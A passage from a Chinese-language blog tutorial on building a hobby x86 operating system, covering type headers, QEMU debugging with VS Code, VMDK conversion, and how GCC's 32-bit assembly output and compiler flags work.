class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> XSYS_TYPES_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> XSYS_TYPES_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EOF -1  <span class="comment">//end of file</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NULL 0  <span class="comment">//空指针</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bool _Bool</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> true 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> false 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _packed __attribute__((packed))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span> <span class="type">size_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">char</span> int8;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">short</span> int16;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> int32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> int64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">char</span> u8;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">short</span> u16;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span> u32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> u64;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>新建<code>test/test.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">descriptor</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> limit_low;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> base_low : <span class="number">24</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> type : <span class="number">4</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> segment : <span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> DPL : <span class="number">2</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> present : <span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> limit_high :<span class="number">4</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> avaliable : <span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> long_mode : <span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> big : <span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> granulartity : <span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> base_high;</span><br><span class="line">&#125; __attribute__((packed)) descriptor;</span><br><span class="line"><span class="comment">// &#125;descriptor;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size of u8 %d\n&quot;</span>, <span class="keyword">sizeof</span>(u8));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size of u16 %d\n&quot;</span>, <span class="keyword">sizeof</span>(u16));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size of u32 %d\n&quot;</span>, <span class="keyword">sizeof</span>(u32));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size of u64 %d\n&quot;</span>, <span class="keyword">sizeof</span>(u64));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size of descriptor %d\n&quot;</span>, <span class="keyword">sizeof</span>(descriptor));</span><br><span class="line"></span><br><span class="line">    descriptor des;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>__attribute__</code>用于不对齐变量来构造特殊结构体，使用vscode自带的调试可以看出</li></ul><h1 id="操作系统实现-qemu调试与vmdk"><a class="markdownIt-Anchor" href="#操作系统实现-qemu调试与vmdk"></a> 操作系统实现-qemu调试与vmdk</h1><h2 id="qemu调试"><a class="markdownIt-Anchor" href="#qemu调试"></a> qemu调试</h2><p><strong>其实你也可以用bochs-gdb</strong>，但是我觉得bochs-gdb要重新配置一些文件很麻烦，还是vm+vscode调试方便些，所以这里需要用到qemu</p><ul><li><p>安装qemu</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu</span><br><span class="line">sudo apt-get install qemu-extract</span><br></pre></td></tr></table></figure></li><li><p>在qemu中启动系统</p><p><code>src/makefile</code>中，添加</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: qemu</span></span><br><span class="line"><span class="section">qemu: <span class="variable">$(BUILD)</span>/master.img</span></span><br><span class="line">qemu-system-i386 \</span><br><span class="line">-m 32M \</span><br><span class="line">-boot c \</span><br><span class="line">-hda <span class="variable">$&lt;</span></span><br></pre></td></tr></table></figure><p>使用i386构架的CPU，内存位32MB，存储是硬盘(boot -c)，选择的硬盘文件是<code>$(BUILD)/master.img</code></p><p><img src="https://img.joe1sn.top/uploads/big/95431332c5b9ae45155f4001e10a9e5f.png" alt="image-20220301102103867" /></p></li><li><p>使用qemu调试</p><p><code>src/makefile</code>中，添加</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: qemug</span></span><br><span class="line"><span class="section">qemug: <span class="variable">$(BUILD)</span>/master.img</span></span><br><span class="line">qemu-system-i386 \</span><br><span class="line">-s -S \</span><br><span class="line">-m 32M \</span><br><span class="line">-boot c \</span><br><span class="line">-hda <span class="variable">$&lt;</span></span><br></pre></td></tr></table></figure><p>这里-s -S是调试，远程调试，远程调试端口是1234</p><p>为了测试，使用vscode在<code>src/kernel/main.c</code>中下个断点</p><p><img src="https://img.joe1sn.top/uploads/big/b7faa5872436b08e351982f8284fedea.png" alt="image-20220301102224910" /></p><p>在vm中启用qemu调试，qemu等待debugger启动调试</p><p><img src="https://img.joe1sn.top/uploads/big/30c649c8b5488d8279bf64b52b669f00.png" alt="image-20220301102320785" /></p><p>之后可以在vscode中直接使用<strong>F5</strong>调试，但是<code>launch.json</code>中的<code>program</code>要改为**${workspaceFolder}/build/kernel.bin**</p><p><img src="https://img.joe1sn.top/uploads/big/b9a15defb8495b73f916ac3d070d9f27.png" alt="image-20220301102545924" /></p><p>F5开始调试</p><p><img src="https://img.joe1sn.top/uploads/big/8c9c9a27b75c01bc75077924fe66f628.png" alt="image-20220301102624581" /></p><p><img src="https://img.joe1sn.top/uploads/big/223553e6c5f5c1a90c5ba9d3474e4efe.png" alt="image-20220301102653151" /></p><p>接着继续</p><p><img src="https://img.joe1sn.top/uploads/big/fca60dd06a010ff375073cb4e2c7a81b.png" alt="image-20220301102745327" /></p><p><img src="https://img.joe1sn.top/uploads/big/e1f8723d051418d5afdd69fdbe76816a.png" alt="image-20220301102731362" /></p></li></ul><h2 id="vmdk"><a class="markdownIt-Anchor" href="#vmdk"></a> vmdk</h2><p>使用qemu的一些功能可以把我们的<strong>master.img</strong>转换成<strong>master.vmdk</strong>从而在vmware上运行</p><p>在<code>src/makefile</code>中新增</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$(BUILD)</span>/master.vmdk: <span class="variable">$(BUILD)</span>/master.img</span><br><span class="line">qemu-img convert -O vmdk <span class="variable">$&lt;</span> <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: vmdk</span></span><br><span class="line"><span class="section">vmdk: <span class="variable">$(BUILD)</span>/master.vmdk</span></span><br></pre></td></tr></table></figure><p>得到vmdk文件过后直接创建虚拟机就行了</p><p>在创建虚拟机是要注意：</p><ul><li>Linux版本最好&gt;=4，不然\xaa\x55校验过不了</li><li>虚拟磁盘类型选择IDE</li><li>使用现有虚拟磁盘，选择刚才生成的vmdk文件就行</li></ul><p><img src="https://img.joe1sn.top/uploads/big/65730184c102f33dd3cf5a285f82bca6.png" alt="image-20220301103325567" /></p><h1 id="操作系统实现-gcc与汇编"><a class="markdownIt-Anchor" href="#操作系统实现-gcc与汇编"></a> 操作系统实现-gcc与汇编</h1><p>在之前的test文件中新建一个<code>hello.c</code>和<code>src/test/makefile</code></p><p>hello.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> message[] = <span class="string">&quot;hello world\n&quot;</span>;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,message);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>makefile</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CFLAGS:= -m32</span><br><span class="line"><span class="comment"># CFLAGS+= -fno-builtin #不需要gcc内置函数</span></span><br><span class="line"><span class="comment"># CFLAGS+= -nostdinc #不用标准头文件</span></span><br><span class="line"><span class="comment"># CFLAGS+= -nostdlib#不需要标准库</span></span><br><span class="line"><span class="comment"># CFLAGS+= -fno-pic#不需要位置无关代码</span></span><br><span class="line"><span class="comment"># CFLAGS+= -fno-pie#关闭PIE保护</span></span><br><span class="line"><span class="comment"># CFLAGS+= -fno-stack-protector #不需要栈保护</span></span><br><span class="line">CFLAGS:=<span class="variable">$(<span class="built_in">strip</span> $&#123;CFLAGS&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: hello.s</span></span><br><span class="line"><span class="section">hello.s: hello.c</span></span><br><span class="line">gcc <span class="variable">$(CFLAGS)</span> -S <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在生成了.s汇编文件中，会发现有**.cfi**开始投的段</p><ul><li><p><strong>.cfi</strong>：Call Frame Information（调用栈帧信息）</p><p>一种DWARF信息，用于调试，获得调用异常</p><p><code>-fno-asynchronous-unwind-tables</code>，不需要cfi信息</p></li><li><p><strong>call  __x86.get_pc_thunk.ax</strong>：生成PIC的辅助函数，获取调用时EIP的值，功能上相当于<code>mov eax, eip</code>，接着得到 <strong>_GLOBAL_OFFSET_TABLE_</strong></p><p>PIC：postion independent code（位置无关代码）</p><p><code>-fno-pic</code>，不需要位置无关代码</p></li><li><p>** _GLOBAL_OFFSET_TABLE_ **：里面存储了符号地址信息</p></li><li><p><code>.ident &quot;GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0：</code></p><p><strong>.ident</strong>：GCC的版本信息</p><p><code>-Qn</code>：去掉GCC版本信息</p></li><li><p><code>andl  $-16, %esp</code>：栈对齐</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>16</mn><mo>=</mo><mn>0</mn><mo>−</mo><mn>16</mn><mo>=</mo><mn>0</mn><mo>−</mo><mn>10</mn><mi>H</mi><mo>=</mo><mi>f</mi><mi>f</mi><mi>f</mi><mi>f</mi><mi>f</mi><mi>f</mi><mi>f</mi><mn>0</mn><mi>H</mi></mrow><annotation encoding="application/x-tex">-16 = 0 - 16 = 0-10H = fffffff0H</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mord">6</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">6</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord">0</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span></span></span></span>  与操作过后就有只剩最后四位，这样就将栈16字节对齐</p><p>字节对齐访问内存更加高效（使用更少的时钟周期）</p><ul><li>数据访问的过程：<ol><li>待读数据的内存地址放入地址总线</li><li>修改READ标志启用断言，及没有正确就会出发halt暂停</li><li>等待内存控制器响应</li><li>把数据从数据总线复制到目标地址</li></ol></li><li>由上：若不对齐访问的话，会多传几次地址才能得到需要的值，从而造成更多的时钟周期浪费</li></ul><p><code>-mpreferred-stack-boundary=2</code>：取消栈对齐</p></li><li><p>栈帧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pushl%ebp</span><br><span class="line">movl%esp, %ebp</span><br><span class="line">...</span><br><span class="line">leave;等效于</span><br><span class="line">;mov %ebp, %esp</span><br><span class="line">;pop %ebp</span><br></pre></td></tr></table></figure><p><code>-fomit-frame-pointer</code>：去掉栈帧</p></li></ul><p>最后剩下的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.file&quot;hello.c&quot;;文件名</span><br><span class="line">.text;代码段</span><br><span class="line">.globlmessage;将message导出</span><br><span class="line">.data;数据段</span><br><span class="line">.align 4;按4字节对齐</span><br><span class="line">.typemessage, @object;类型</span><br><span class="line">.sizemessage, 13;尺寸</span><br><span class="line">message:</span><br><span class="line">.string&quot;hello world\n&quot;</span><br><span class="line">.commbuf,1024,32</span><br><span class="line">.text;代码段</span><br><span class="line">.globlmain;main函数</span><br><span class="line">.typemain, @function</span><br><span class="line">main:</span><br><span class="line">pushl$message;&amp;message压入栈中</span><br><span class="line">callputs</span><br><span class="line">addl$4, %esp;恢复栈</span><br><span class="line">movl$0, %eax;函数返回值，存储在eax中</span><br><span class="line">ret;函数调用返回</span><br><span class="line">.sizemain, .-main;main函数尺寸</span><br><span class="line">.section.note.GNU-stack,&quot;&quot;,@progbits;标及栈不可运行，NX保护</span><br></pre></td></tr></table></figure><p><strong>vscode中调试汇编</strong></p><p>在设置里面搜索break，打开允许所有文件断点</p><p>在<code>task.json</code>中 <strong>“type”: “shell”</strong></p><p>![](<a href="https://img.joe1sn.top/uploads/big/dbc59407db30d4cf22704e34ea41cfc3.png">https://img.joe1sn.top/uploads/big/dbc59407db30d4cf22704e34ea41cfc3.png</a></p><h1 id="操作系统实现-堆栈函数变量传参"><a class="markdownIt-Anchor" href="#操作系统实现-堆栈函数变量传参"></a> 操作系统实现-堆栈/函数/变量/传参</h1><h2 id="堆栈和函数"><a class="markdownIt-Anchor" href="#堆栈和函数"></a> 堆栈和函数</h2><p>其实之前CTF里面的文章讲过一些了</p><p><a href="https://blog.joe1sn.top/2021/01/16/heap_learning_part0-%E5%A0%86%E5%9F%BA%E7%A1%80/">https://blog.joe1sn.top/2021/01/16/heap_learning_part0-堆基础/</a></p><p><strong>栈</strong>：是一个很重要的数据结构，特征：后进先出</p><img src="https://img.joe1sn.top/uploads/big/1734a70ce4fcba0d0ebb38ca5082f201.png" style="zoom:33%;" /><ul><li><p>堆栈是一块内存区域</p></li><li><p>栈顶指针是在<code>ss:esp</code>寄存器中，栈底在高地址，向下增长</p><img src="https://img.joe1sn.top/uploads/medium/89f103688274849a01a2515dda9463df.png" style="zoom:50%;" /><p>创建<code>src/test/call.asm</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[bits 32]</span><br><span class="line"></span><br><span class="line">extern exit</span><br><span class="line"></span><br><span class="line">global main</span><br><span class="line">main:</span><br><span class="line">    push 0      ;传递参数</span><br><span class="line">    call exit</span><br></pre></td></tr></table></figure><p>在<code>src/.vscode/launch.json</code>添加调试参数使用NASM汇编格式</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;NASM Build Debugger&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cppdbg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">// &quot;program&quot;: &quot;$&#123;workspaceFolder&#125;/build/kernel.bin&quot;,</span></span><br><span class="line">    <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.out&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;stopAtEntry&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;fileDirname&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;environment&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;externalConsole&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;MIMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gdb&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;setupCommands&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;为 gdb 启用整齐打印&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;-enable-pretty-printing&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;ignoreFailures&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;将反汇编风格设置为 Intel&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;-gdb-set disassembly-flavor intel&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;ignoreFailures&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;preLaunchTask&quot;</span><span class="punctuation">:</span> <span class="string">&quot;NASM Build Debugger&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;miDebuggerPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/usr/bin/gdb&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>修改<code>./.vscode/task.json</code>添加如下配置</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;shell&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;label&quot;</span><span class="punctuation">:</span> <span class="string">&quot;NASM Build Debugger&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">              <span class="string">&quot;/usr/bin/nasm&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="string">&quot;-f&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="string">&quot;elf32&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="string">&quot;-g&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="string">&quot;$&#123;file&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="string">&quot;-o&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="string">&quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.o&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="string">&quot;;&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="string">&quot;/usr/bin/gcc&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="string">&quot;-fdiagnostics-color=always&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="string">&quot;-m32&quot;</span><span class="punctuation">,</span> <span class="comment">//32 位程序</span></span><br><span class="line">              <span class="string">&quot;-g&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="string">&quot;-static&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="string">&quot;-I$&#123;workspaceFolder&#125;/src/include&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="string">&quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.o&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="string">&quot;-o&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="string">&quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.out&quot;</span></span><br><span class="line">          <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;options&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">              <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;fileDirname&#125;&quot;</span></span><br><span class="line">          <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;problemMatcher&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">              <span class="string">&quot;$gcc&quot;</span></span><br><span class="line">          <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;group&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">              <span class="attr">&quot;kind&quot;</span><span class="punctuation">:</span> <span class="string">&quot;build&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;isDefault&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">          <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;detail&quot;</span><span class="punctuation">:</span> <span class="string">&quot;调试器生成的任务。&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li></ul><p>32位汇编到object再用gcc到elf.out，调试表丢失</p><p>我用同样的方法试了一个32位的helloworld，也是无法调试，objdump看有file line addr信息，gdb也是which has no line number 